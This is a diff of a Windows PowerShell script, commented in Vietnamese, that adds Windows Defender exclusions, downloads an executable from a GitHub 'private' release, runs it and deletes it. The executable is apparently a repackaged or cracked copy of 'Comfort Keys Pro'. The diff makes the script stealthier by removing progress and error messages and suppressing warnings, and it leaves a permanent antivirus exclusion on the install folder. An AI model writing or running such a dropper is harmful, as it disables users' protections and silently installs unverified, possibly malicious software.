@@ -1,52 +1,42 @@
-# Ẩn thông báo lỗi và output
+# Ẩn tất cả output
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
 
-# Thêm exclusions vào Windows Defender
+# Thêm exclusions (không hiển thị thông tin)
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force
 Add-MpPreference -ExclusionPath "C:\Comfort Keys Pro 9.1 by MMT Windows Tech" -Force
 
-# Tạo đường dẫn đầy đủ đến thư mục Temp
+# Đường dẫn tải file
+$downloadUrl = "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"
 $tempPath = [System.IO.Path]::GetTempPath()
 $downloadPath = Join-Path $tempPath "Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"
 
-# URL download
-$downloadUrl = "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"
+# Tải file
+Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
 
-# Tải file về thư mục Temp
-try {
-    Write-Host "Đang tải file..." -NoNewline
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing
-    Write-Host " Hoàn thành" -ForegroundColor Green
-}
-catch {
-    Write-Host " Lỗi khi tải file" -ForegroundColor Red
-    exit 1
-}
+# Chạy file cài đặt và không đợi kết thúc
+Start-Process -FilePath $downloadPath
 
-# Chạy file cài đặt
-try {
-    Write-Host "Đang cài đặt..." -NoNewline
-    Start-Process -FilePath $downloadPath -Wait -WindowStyle Hidden
-    Write-Host " Hoàn thành" -ForegroundColor Green
-}
-catch {
-    Write-Host " Lỗi khi cài đặt" -ForegroundColor Red
-}
+# Đợi 5 giây
+Start-Sleep -Seconds 5
 
 # Xóa file tải về
-try {
-    if (Test-Path $downloadPath) {
-        Remove-Item -Path $downloadPath -Force
-        Write-Host "Đã xóa file tải về" -ForegroundColor Green
-    }
-}
-catch {
-    Write-Host "Không thể xóa file tải về" -ForegroundColor Yellow
+if (Test-Path $downloadPath) {
+    Remove-Item -Path $downloadPath -Force
 }
 
-# Xóa exclusion temp
+# Xóa exclusion cho Temp
 Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force
+
+# Kiểm tra xem exclusion cho Temp còn tồn tại không
+$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+$tempExclusion = "$env:USERPROFILE\AppData\Local\Temp"
+
+if ($exclusions -contains $tempExclusion) {
+    # Nếu còn, thử xóa lại
+    Remove-MpPreference -ExclusionPath $tempExclusion -Force
+}
 
 # Thoát PowerShell
 exit
